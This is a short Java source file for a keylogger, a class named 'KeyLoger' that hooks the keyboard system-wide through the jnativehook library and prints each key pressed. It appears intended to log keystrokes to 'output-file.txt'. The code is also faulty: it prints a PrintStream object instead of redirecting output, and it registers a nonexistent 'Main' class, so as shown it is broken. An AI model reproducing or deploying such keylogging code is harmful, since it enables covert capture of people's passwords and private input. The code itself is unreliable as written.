package main;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLoger implements NativeKeyListener {

	public static void main(String[] args) {
		try {
			
			File file = new File("output-file.txt");
			FileOutputStream fos = new FileOutputStream(file, true);
			System.out.println(new PrintStream(fos));
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		try {
			GlobalScreen.registerNativeHook();
		} catch (Exception e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new Main());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Pressed"+ NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		
	}
}
